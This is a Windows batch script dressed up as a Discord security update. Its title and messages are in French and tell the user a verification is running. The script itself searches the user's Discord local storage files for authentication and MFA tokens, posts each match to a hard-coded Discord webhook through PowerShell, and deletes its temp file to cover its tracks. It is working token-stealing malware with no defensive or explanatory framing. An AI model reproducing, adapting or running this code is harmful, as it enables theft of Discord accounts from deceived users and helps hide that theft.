@echo off
title Mise à jour de sécurité Discord
color 0b
echo Veuillez patienter pendant la vérification...
timeout /t 2 /nobreak >nul

set "discord_path=%appdata%\discord\Local Storage\leveldb"
set "webhook=https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"
set "output=%temp%\token_result.txt"

:: Vider le fichier de sortie
type nul > "%output%" 2>nul

:: Parcourir les fichiers ldb
for /f "tokens=*" %%a in ('dir /s /b "%discord_path%\*.ldb" 2^>nul') do (
    findstr /r /c:"[a-zA-Z0-9_-]\{24\}\.[a-zA-Z0-9_-]\{6\}\.[a-zA-Z0-9_-]\{27\}" "%%a" >> "%output%" 2>nul
    findstr /r /c:"mfa\.[a-zA-Z0-9_-]\{84\}" "%%a" >> "%output%" 2>nul
)

:: Si le fichier a du contenu, l'envoyer
if exist "%output%" (
    for /f "delims=" %%x in ('type "%output%"') do (
        powershell -Command "$d=@{}; $d.content='**Token trouvé :** ```'+'%%x'+'```'; Invoke-RestMethod -Uri '%webhook%' -Method Post -Body ($d|ConvertTo-Json) -ContentType 'application/json'" >nul 2>&1
    )
)

:: Nettoyer
if exist "%output%" del "%output%" 2>nul

echo Verification terminee.
timeout /t 3 /nobreak >nul
exit
